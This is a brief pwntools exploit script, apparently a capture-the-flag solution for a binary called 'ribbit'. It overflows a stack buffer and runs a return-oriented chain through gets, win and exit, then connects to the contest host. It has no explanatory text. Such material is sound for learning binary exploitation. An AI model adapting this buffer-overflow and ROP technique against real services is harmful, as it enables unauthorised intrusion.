from pwn import *
e = ELF('./ribbit')
#r = process('./ribbit')
#r = gdb.debug('./ribbit', 'b win\nc')
r = remote('chal.nbctf.com', 30170)
pop_rdi = 0x000000000040201f
pop_rsi = 0x000000000040a04e
r.sendline(b'a'*(0x20+8)+p64(pop_rdi)+p64(e.bss(0))+p64(e.sym['gets'])+p64(pop_rdi)+p64(0xf10c70b33f)+p64(pop_rsi)+p64(e.bss(0))+p64(e.sym['win'])+p64(pop_rdi)+p64(0)+p64(e.sym['exit']))
r.sendline(b'You got this!\x00'+b'a'*7+b'Just do it!\x00')
r.interactive()


